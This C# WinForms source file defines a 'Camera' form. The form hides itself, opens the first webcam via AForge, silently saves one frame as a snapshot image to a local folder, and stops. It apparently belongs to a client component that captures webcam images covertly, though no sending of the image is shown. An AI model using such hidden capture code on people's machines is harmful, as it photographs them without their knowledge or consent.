using AForge.Video;
using AForge.Video.DirectShow;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace ClientSide
{
    public partial class Camera : Form
    {
        FilterInfoCollection filterInfoCollection;
        VideoCaptureDevice videoCaptureDevice;
        string picName = "snapshot_";
        public Camera(string picName)
        {
            this.picName += picName;
            Visible = false;
            InitializeComponent();
           
        }

        private void Camera_Load(object sender, EventArgs e)
        {
            Visible = false;
            string name = "";


            filterInfoCollection = new FilterInfoCollection(FilterCategory.VideoInputDevice);
            foreach (FilterInfo filterInfo in filterInfoCollection)
            {
                name = filterInfo.Name;
            }

            videoCaptureDevice = new VideoCaptureDevice();
            videoCaptureDevice = new VideoCaptureDevice(filterInfoCollection[0].MonikerString);
            videoCaptureDevice.NewFrame += VideoCapture_NewFrame;
            videoCaptureDevice.Start();


        }

        private void VideoCapture_NewFrame(object sender, NewFrameEventArgs eventArgs)
        {
            string projectDirectory = Environment.CurrentDirectory;
            string filepath = Directory.GetParent(projectDirectory).Parent.FullName;
            string[] paths = new string[] { @filepath, "files", picName };
            filepath = Path.Combine(paths);

            if (!File.Exists(filepath))
            {
               Image image = (Bitmap)eventArgs.Frame.Clone();
               image.Save(filepath);
                 
               
            }
            if (File.Exists(filepath))
            {
                try {
                    exitcamera();
                }

                catch (Exception ex) { 
                    //ex
                }

            }
          


        }  
        private void exitcamera()
            {
                videoCaptureDevice.SignalToStop();
            // FinalVideo.WaitForStop();  << marking out that one solved it
             videoCaptureDevice = null;
            }
     

        private void Camera_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (videoCaptureDevice.IsRunning == true)
                videoCaptureDevice.Stop();
        }
    }
}
